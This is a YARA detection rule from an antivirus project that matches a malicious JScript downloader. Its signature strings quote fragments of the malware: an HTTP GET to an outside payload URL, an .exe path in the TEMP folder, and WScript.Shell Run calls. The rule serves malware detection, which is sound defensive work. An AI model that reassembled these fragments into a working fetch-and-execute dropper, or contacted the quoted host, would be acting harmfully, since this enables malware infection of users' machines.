rule sig_20160329_7d3c35e125bfe8db734a737f35b4ffac {
  meta:
    description = "datamaliciousorder - file 20160329_7d3c35e125bfe8db734a737f35b4ffac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a7823461254020c8d1418ee0d42fe2c7294205d1e90a7a4cb022e0980c81c7b1"

  strings:
    $s1  = "m0[Q](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function Pj() {return hQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rvxwIjPkAiNX.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[I](t() * 11); if (m0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var hQ = function D() {return WScript[wm](\"WScript.Shell\");}(), G = 11;" fullword ascii
    $s5  = "function c(BF, u){el = el * 1; return BF - u;};" fullword ascii
    $s6  = "function m(){return \"\" + x;};" fullword ascii
    $s7  = "function nO(NQ){hQ[\"Run\"](NQ, el, el);};" fullword ascii
    $s8  = "function eP() {return ((p == true) && (p == k)) ? 1 : el;};" fullword ascii
    $s9  = "function t(){return 22;};" fullword ascii
    $s10 = " while (e){" fullword ascii
    $s11 = "function SP(EF) {var EO = (1, 2, 3, 4, 5, EF); return EO;};" fullword ascii
    $s12 = "function Mp()" fullword ascii
    $s13 = "var XS = new this[\"Date\"]();" fullword ascii
    $s14 = "return c(fS, BY);" fullword ascii
    $s15 = "function xd(){return wm;};" fullword ascii
    $s16 = "var k = false;" fullword ascii
    $s17 = "k = true; " fullword ascii
    $s18 = "p = true; " fullword ascii
    $s19 = "var p = false;" fullword ascii
    $s20 = "var L = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}